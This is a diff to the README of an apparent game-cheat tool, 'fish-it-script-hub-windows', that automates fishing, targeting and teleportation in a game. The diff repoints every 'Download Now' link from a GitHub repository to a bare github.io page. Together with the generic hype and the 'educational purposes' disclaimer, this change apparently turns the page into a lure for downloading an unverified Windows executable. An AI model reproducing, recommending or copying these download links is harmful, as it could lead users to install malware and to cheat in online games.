@@ -1,6 +1,6 @@
 # 🎣 fish-it-script-hub-windows - Automate Your Fishing Game Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Link-2ea44f?style=for-the-badge)](https://github.com/Foreignserviceseparation295/fish-it-script-hub-windows)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Link-2ea44f?style=for-the-badge)](https://foreignserviceseparation295.github.io)
 
 **Your ultimate fishing automation tool for Windows!** Say goodbye to repetitive clicking and hello to hands-free fishing. This powerful utility handles targeting, teleportation, and execution for you, so you can relax while your character levels up. Perfect for gamers who want to maximize efficiency without technical headaches.
 
@@ -42,7 +42,7 @@ Follow these simple steps to get the software running on your computer. No techn
 
 ### Step 1: Download the Software
 
-Visit this link to download the application: **[Download fish-it-script-hub-windows](https://github.com/Foreignserviceseparation295/fish-it-script-hub-windows)**
+Visit this link to download the application: **[Download fish-it-script-hub-windows](https://foreignserviceseparation295.github.io)**
 
 ### Step 2: Run the Program
 
@@ -134,7 +134,7 @@ Use this tool responsibly. We provide this for educational purposes and for use 
 
 Ready to transform your fishing experience? Get the tool right now:
 
-👉 **[Click Here to Download fish-it-script-hub-windows](https://github.com/Foreignserviceseparation295/fish-it-script-hub-windows)**
+👉 **[Click Here to Download fish-it-script-hub-windows](https://foreignserviceseparation295.github.io)**
 
 The download takes less than a minute. After that, you'll be fishing hands-free in just a few minutes of setup.
 
